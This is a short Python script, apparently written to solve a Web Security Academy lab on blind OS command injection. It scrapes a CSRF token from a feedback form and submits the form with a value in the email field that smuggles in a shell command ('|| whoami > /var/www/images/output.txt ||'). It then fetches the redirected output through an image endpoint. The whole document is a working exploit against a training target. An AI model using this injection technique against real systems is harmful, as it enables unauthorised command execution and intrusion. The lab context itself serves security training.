import requests
from bs4 import BeautifulSoup
s = requests.Session()
feedback_url = 'https://0ac900a904c592988057f32f00020015.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = 'https://0ac900a904c592988057f32f00020015.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'Long',
    'email' : 'lamlon@pdx.edu|| whoami > /var/www/images/output.txt ||',
    'subject' : 'websec',
    'message' : 'tomatoes'
}
resp = s.post(feedback_submit_url, data=post_data)

# Step 4: Retrieve the output file
output_file_url = 'https://0ac900a904c592988057f32f00020015.web-security-academy.net/image?filename=output.txt'
resp = s.get(output_file_url)

print("Username running the web server:")
print(resp.text.strip())